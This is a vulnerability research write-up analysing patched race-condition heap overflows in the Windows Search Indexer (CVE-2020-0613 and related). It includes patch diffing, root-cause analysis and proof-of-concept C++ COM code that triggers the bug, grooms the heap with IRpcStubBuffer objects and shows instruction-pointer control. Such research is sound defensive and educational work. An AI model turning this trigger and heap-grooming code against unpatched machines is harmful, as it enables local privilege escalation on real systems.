---
title: Analysis of vulnerabilities in MS SearchIndexer
author: SungHyun Park @ Diffense
---


### Introduction

The Jan-Feb 2020 security patch fixes multiple bugs in the *Windows Search Indexer*. 

Reported CVEs is as follows[^1] :
- CVE-2020-0613, CVE-2020-0614, CVE-2020-0623, CVE-2020-0625, CVE-2020-0626, CVE-2020-0627, CVE-2020-0628, CVE-2020-0629, CVE-2020-0630, CVE-2020-0631, CVE-2020-0632, CVE-2020-0633 (Jan, 2020)
- CVE-2020-0666, CVE-2020-0667, CVE-2020-0735, CVE-2020-0752 (Feb, 2020)

![cve](https://user-images.githubusercontent.com/11327974/77618263-51a95800-6f79-11ea-8fb7-725d72f333d8.jpg)

Several Local Privilege Escalation(LPE) vulnerability in the Windows Search Indexer have been found, as shown above. Thus, we decided to analyze details from the applied patches and share them. 




### Windows Search Indexer

Windows Search Indexer is a Windows Service that handles indexing of your files for Windows Search, which fuels the file search engine built into windows that powers everything from the Start Menu search box to Windows Explorer, and even the Libraries feature.

Search Indexer helps direct the users to the service interface through GUI, an indexing option, from their perspectives, as indicated below.

![indexing_option](https://user-images.githubusercontent.com/11327974/77618360-84ebe700-6f79-11ea-8fd1-cfca179ef2a3.png)

인덱싱 과정에서 생성되는 DB정보와 관련된 임시 데이터는 모두 파일로 저장되고 관리된다. 보통 이 과정에서 서비스는 NT AUTHORITY SYSTEM 권한으로 파일을 다루기 때문에 만약(If) 파일 경로 조작에 따른 논리적 결함 취약점이 존재할 경우 EoP를 유도할 수 있다.
우리는 Search Indexer 또한 이와 같은 취약점 일 것이라고 생각했다. 왜냐하면 최근 윈도우 서비스에서 발생한 취약점의 대부분이 logic bug에 따른 LPE 취약점이었기 때문이었다. 하지만 분석 결과 우리가 생각했던 것이 아니었고, 이와 관련한 내용을 뒤에서 자세히 소개하겠다.





### Patch Diffing

The analysis environment was Windows7 x86 in that it had a small size of updated file and enabled intuitive diffing. We downloaded both patched and unpatched versions of this module.

For win7 x86 :

- patched version (January Patch Tuesday) : KB4534314
- patched version (February Patch Tuesday) : KB4537813

They can be downloaded from Microsoft Update Catalog[^2]

We started with a BinDiff of the binaries modified by the patch (in this case there is only one: searchindexer.exe)

![diffing_2](https://user-images.githubusercontent.com/11327974/77664228-5d207180-6fc1-11ea-8b6c-74a47f6839d5.PNG)

Most of the patches were done in the CSearchCrawlScopeManager and CSearchRoot class.  The former was patched in January, and then the latter was patched the following month. Both class contained the same change, so we focused on CSearchRoot patched.

The following figure shows that primitive codes were added, which used a Lock to securely access shared resources. We deduced that accessing the shared resources gave rise to the occurrence of the race condition vulnerability in that the patch consisted of putter, getter function.

![a](https://user-images.githubusercontent.com/39076499/77615091-d42e1980-6f71-11ea-8cfe-9e53c018546c.png)

![b](https://user-images.githubusercontent.com/39076499/77615097-d5f7dd00-6f71-11ea-9156-70199300ab65.png)




### More detailed analysis of patched functions.

We referred to the MSDN to see how those classes were used and uncovered that they were all related to the Crawl Scope Manager. And we could check the method information of this class.

And the MSDN said[^3] : 

> The Crawl Scope Manager (CSM) is a set of APIs that lets you add, remove, and enumerate search roots and scope rules for the Windows Search indexer. When you want the indexer to begin crawling a new container, you can use the CSM to set the search root(s) and scope rules for paths within the search root(s). For example, if you install a new protocol handler, you can create a search root and add one or more inclusion rules; then the indexer can start a crawl for the initial indexing. The CSM offers the following interfaces to help you do this programmatically.

- [IEnumSearchRoots](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-ienumsearchroots)
- [IEnumSearchScopeRules](https://msdn.microsoft.com/library/bb266499(VS.85).aspx)
- [ISearchCrawlScopeManager](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-isearchcrawlscopemanager)
- [ISearchCrawlScopeManager2](https://msdn.microsoft.com/library/dd797832(VS.85).aspx)
- [ISearchRoot](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-isearchroot)
- [ISearchScopeRule](https://docs.microsoft.com/en-us/windows/desktop/api/Searchapi/nn-searchapi-isearchscoperule)
- [ISearchItem](https://msdn.microsoft.com/library/dd756722(VS.85).aspx)

For examples, adding, removing, and enumerating search roots and scope rules can be written by the following :

The ISearchCrawlScopeManager tells the search engine about containers to crawl and/or watch, and items under those containers to include or exclude. To add a new search root, instantiate an ISearchRoot object, set the root attributes, and then call ISearchCrawlScopeManager::AddRoot and pass it a pointer to ISearchRoot object.

```cpp
// Add RootInfo & Scope Rule
pISearchRoot->put_RootURL(L"file:///C:\ ");
pSearchCrawlScopeManager->AddRoot(pISearchRoot);
pSearchCrawlScopeManager->AddDefaultScopeRule(L"file:///C:\Windows", fInclude, FF_INDEXCOMPLEXURLS);

// Set Registry key
pSearchCrawlScopeManager->SaveAll(); 
```

We can also use ISearchCrawlScopeManager to remove a root from the crawl scope when we no longer want that URL indexed. Removing a root also deletes all scope rules for that URL. We can uninstall the application, remove all data, and then remove the search root from the crawl scope, and the Crawl Scope Manager will remove the root and all scope rules associated with the root.

```cpp
// Remove RootInfo & Scope Rule
ISearchCrawlScopeManager->RemoveRoot(pszURL);

// Set Registry key
ISearchCrawlScopeManager->SaveAll(); 
``` 

The CSM enumerates search roots using IEnumSearchRoots. We can use this class to enumerate search roots for a number of purposes. For example, we might want to display the entire crawl scope in a user interface, or discover whether a particular root or the child of a root is already in the crawl scope.

```cpp
// Display RootInfo
PWSTR pszUrl = NULL;
pSearchRoot->get_RootURL(&pszUrl);
wcout << L"\t" << pszUrl;

// Display Scope Rule
IEnumSearchScopeRules *pScopeRules;
pSearchCrawlScopeManager->EnumerateScopeRules(&pScopeRules);

ISearchScopeRule *pSearchScopeRule;
pScopeRules->Next(1, &pSearchScopeRule, NULL))

pSearchScopeRule->get_PatternOrURL(&pszUrl);
wcout << L"\t" << pszUrl;
```

We thought that a vulnerability would arise in the process of manipulating URL. Accordingly, we started analyzing the root causes.




### Root Cause Analysis

We conducted binary analysis focusing by the following functions :

- [ISearchRoot::put_RootURL](https://docs.microsoft.com/en-us/windows/win32/api/searchapi/nf-searchapi-isearchroot-put_rooturl)
- [ISearchRoot::get_RootURL](https://docs.microsoft.com/en-us/windows/win32/api/searchapi/nf-searchapi-isearchroot-get_rooturl)

While analyzing ISearchRoot::put_RootURL and ISearchRoot::get_RootURL, we figured out that the object's shared variable (CSearchRoot + 0x14) was actually referenced.

The put_RootURL function wrote a user-controlled data in the memory of CSearchRoot+0x14. The get_RootURL function read the data located in the memory of CSearchRoot+0x14. , it appeared that the vulnerability was caused by this shared variable concerning patches.

![image](https://user-images.githubusercontent.com/11327974/77677607-484cd980-6fd3-11ea-91ce-91638c0da03c.png)

![image](https://user-images.githubusercontent.com/11327974/77677685-60bcf400-6fd3-11ea-8c64-462952e4c8b3.png)

Thus, we finally got to the point where the vulnerability actually initiated.

The vulnerability was in the process of double fetching length, and the vulnerability could be triggered when the following occurs:

1. First fetch: Shared variable used as memory allocation size (line 9)
2. Second fetch: Shared variable used as memory copy size (line 13)

![image](https://user-images.githubusercontent.com/11327974/77712748-0c883300-7018-11ea-8c2f-9d588f4d8388.png)

If the size of the first and that of the second differed, a heap overflow might occur, especially when the second fetch had a large size. We maintained that we change the size of pszURL (shared value) sufficiently through the race condition before the memory copy occurs.




### Triggering POC

Through OleView[^5], we were able to see the interface provided by Windows Search Manager. And we needed to trigger vulnerable functions based on the methods of the interface.

![Trigger](https://user-images.githubusercontent.com/39076499/77615361-86fe7780-6f72-11ea-8de5-1fb81e2291c3.png)

Fortunately, we were able to compile and test it through the COM based command line source code provided by MSDN[^4]. 
We were able to write COM client code that triggered a vulnerable function as following:

```cpp
int wmain(int argc, wchar_t *argv[])
{
    // Initialize COM library
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);

    // CoClass Instanciate
    ISearchRoot *pISearchRoot;
    CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot));

    // Vulnerable function trigger
    pISearchRoot->put_RootURL(L"Shared RootURL");
    PWSTR pszUrl = NULL;
    HRESULT hr = pSearchRoot->get_RootURL(&pszUrl);
    wcout << L"\t" << pszUrl;
    CoTaskMemFree(pszUrl);

    // Free COM resource, End
    pISearchRoot->Release();
    CoUninitialize();
}
```

Thereafter, bug triggering was quite simple. 
We created two threads: one writing different lengths of data to the shared buffer and the other reading data from the shared buffer at the same time.


Thread_01
```cpp
DWORD __stdcall thread_putter(LPVOID param)
{
	ISearchManager *pSearchManager = (ISearchManager*)param;
	while (1) {
		pSearchManager->put_RootURL(L"AA");
		pSearchManager->put_RootURL(L"AAAAAAAAAA");
	}
	return 0;
}
```

Thread_02
```cpp
DWORD __stdcall thread_getter(LPVOID param)
{
	ISearchRoot *pISearchRoot = (ISearchRoot*)param;
	PWSTR get_pszUrl;
	while (1) {
		pISearchRoot->get_RootURL(&get_pszUrl);
	}
	return 0;
}
```

Okay, Crash!

![image](https://user-images.githubusercontent.com/11327974/77719834-9f7d9900-7029-11ea-872c-d9bd67702479.png)

Undoubtedly, the race condition had succeeded before the StringCchCopyW function copied the RootURL data, leading to heap overflow.




### EIP Control

We ought to create an object to the Sever heap where the vulnerability occurs for the sake of controlling EIP.

We wrote the client codes as following, tracking the heap status.

```cpp
int wmain(int argc, wchar_t *argv[])
{
    CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);
    ISearchRoot *pISearchRoot[20];
    for (int i = 0; i < 20; i++) {
        HRESULT hr = CoCreateInstance(CLSID_CSearchRoot, NULL, CLSCTX_ALL, IID_PPV_ARGS(&pISearchRoot[i]));
    }
    pISearchRoot[3]->Release();
    pISearchRoot[5]->Release();
    pISearchRoot[7]->Release();
    pISearchRoot[9]->Release();
    pISearchRoot[11]->Release();

    
    HANDLE t1 = CreateThread(NULL, 0, thread_shared_data_write, (LPVOID)pISearchRoot[13], 0, NULL);
    HANDLE t2 = CreateThread(NULL, 0, thread_shared_data_read, (LPVOID)pISearchRoot[13], 0, NULL);
    WaitForSingleObject(t1, 500);
    
    CoUninitialize();
    return 0;
}
```

We found out that if the client did not release the pISearchRoot object, an IRpcStubBuffer objects would remain on the server heap. And we also saw that the IRpcStubBuffer object remained near the location of the heap where the vulnerability occurred.

```
    0:010> !heap -p -all
    ...
    03d58f10 0005 0005  [00]   03d58f18    0001a - (busy)     <-- CoTaskMalloc return
    	mssprxy!_idxpi_IID_Lookup <PERF> (mssprxy+0x75)
    03d58f38 0005 0005  [00]   03d58f40    00020 - (free)
    03d58f60 0005 0005  [00]   03d58f68    0001c - (busy)     <-- IRpcStubBuffer Obj
      ? mssprxy!_ISearchRootStubVtbl+10
    03d58f88 0005 0005  [00]   03d58f90    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       <-- IRpcStubBuffer Obj
    03d58fb0 0005 0005  [00]   03d58fb8    00020 - (busy)
    03d58fd8 0005 0005  [00]   03d58fe0    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       <-- IRpcStubBuffer Obj
    03d59000 0005 0005  [00]   03d59008    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       <-- IRpcStubBuffer Obj
    03d59028 0005 0005  [00]   03d59030    00020 - (busy)
    03d59050 0005 0005  [00]   03d59058    00020 - (busy)
    03d59078 0005 0005  [00]   03d59080    00020 - (free)
    03d590a0 0005 0005  [00]   03d590a8    00020 - (free)
    03d590c8 0005 0005  [00]   03d590d0    0001c - (busy)
      ? mssprxy!_ISearchRootStubVtbl+10                       <-- IRpcStubBuffer Obj
```

In COM, all interfaces have their own interface stub space. Stubs are small memory spaces used to support remote method calls during RPC communication, and IRpcStubBuffer is the primary interface for such interface stubs. In this process, the IRpcStubBuffer to support pISearchRoot's interface stub remains on the server's heap.

The vtfunction of IRpcStubBuffer is as follows : 

```
    0:003> dds poi(03d58f18) l10
    71215bc8  7121707e mssprxy!CStdStubBuffer_QueryInterface
    71215bcc  71217073 mssprxy!CStdStubBuffer_AddRef
    71215bd0  71216840 mssprxy!CStdStubBuffer_Release
    71215bd4  71217926 mssprxy!CStdStubBuffer_Connect
    71215bd8  71216866 mssprxy!CStdStubBuffer_Disconnect <-- client call : CoUninitialize();
    71215bdc  7121687c mssprxy!CStdStubBuffer_Invoke
    71215be0  7121791b mssprxy!CStdStubBuffer_IsIIDSupported
    71215be4  71217910 mssprxy!CStdStubBuffer_CountRefs
    71215be8  71217905 mssprxy!CStdStubBuffer_DebugServerQueryInterface
    71215bec  712178fa mssprxy!CStdStubBuffer_DebugServerRelease
```

When the client's COM is Uninitialized, IRpcStubBuffer::Disconnect disconnects all connections of object pointer. Therefore, if the client call CoUninitialize function after an oob attack, CStdStubBuffer_Disconnect function is called on the server. It means that users can construct fake vtable and call these function.

However, we haven't always seen IRpcStubBuffer allocated on the same location heap. Therefore, several tries were needed to expect the attackable heap. After several attacks, the IRpcStubBuffer object was covered with the controllable value (0x45454545) as follows.

In the end, we could show that indirect calls to any function in memory are possible!

![eip](https://user-images.githubusercontent.com/39076499/77615799-8ca88d00-6f73-11ea-961b-6081eccf634d.png)




### Conclusion

최근에 윈도우 서비스에서 발생한 LPE 취약점의 대부분은 Logic Bugs 였다. 그런 측면에서 Windows Search Indexer에서 발생한 Memory Corruption 취약점 분석은 매우 흥미로웠습니다. 이처럼 윈도우 서비스에서도 많은 Memory Corruption 취약점이 발생할 수 있으며 이를 간과해서는 안될 것이다. 이 분석의 결과가 취약점 리서처들에게 많은 도움이 되었으면 좋겠다.




### Reference

[^1]: [https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments](https://portal.msrc.microsoft.com/en-us/security-guidance/acknowledgments)

[^2]: [https://www.catalog.update.microsoft.com/Home.aspx](https://www.catalog.update.microsoft.com/Home.aspx)

[^3]: [https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm](https://docs.microsoft.com/en-us/windows/win32/search/-search-3x-wds-extidx-csm)

[^4]: [https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline](https://docs.microsoft.com/en-us/windows/win32/search/-search-sample-crawlscopecommandline)

[^5]: [https://github.com/tyranid/oleviewdotnet](https://github.com/tyranid/oleviewdotnet)
